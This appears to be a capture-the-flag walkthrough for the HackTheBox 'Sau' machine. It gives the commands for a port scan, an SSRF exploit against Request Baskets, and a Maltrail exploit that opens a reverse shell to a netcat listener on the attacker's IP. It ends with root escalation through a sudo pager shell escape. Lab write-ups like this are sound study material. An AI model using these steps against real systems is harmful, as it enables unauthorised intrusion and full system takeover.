![[Sau.png]]
#HackTheBox #Machines #Easy
## Scan Port
```bash
nmap -sCV -Pn {TARGET IP} -T4
```
The results, `22/tcp` `80/tcp` `55555/tcp`
## Connect to Sau
First add new hosts and TARGET IP in `/etc/hosts`. Open your browser with port 55555, because we can't use on port 80.
Create new basket, open basket and copy your basket. Search on your browser `Request basket exploit` and download it. In terminal, type this :
```bash
bash ./CVE-...sh {TARGET IP:PORT} {MY IP:PORT = 127.0.0.1:80}

//ex result
basket = cuyy123
```
The results is we're created new basket, open the basket with the token. Let's try paste the url basket on your browser, and see the result. Look, the result is different than before, on footer you can see `Matrail v.0.53`. So now, search `Maltrail v.0.53 exploits` and download it.
Listen the port use `nc` command
```bash
nc -lvnp 1234
```
Then, we run the exploit.py are downloaded earlier
```python
python3 exploit.py {IP tun0} {PORT} {TARGET IP:PORT}/cuyy123
```
RUN IT. Open the listen port, yeah we can connect, soo now we can find the flag. `ls` for list, `cat` for execute/read. flag 1 is user.txt on Puma users, just `cd ~` and `ls` you can find the flag of user. flag 2 is root.txt on Root directory, `sudo -l`, copy content of NOPASSWD, `sudo ...`, use shebang `!/bin/sh`. Now you're on Root user, `ls` then `cd root` then `ls` again.
Congratulations the last flag has been found by u hehehe.😁👍
![[Sau Clear.png]]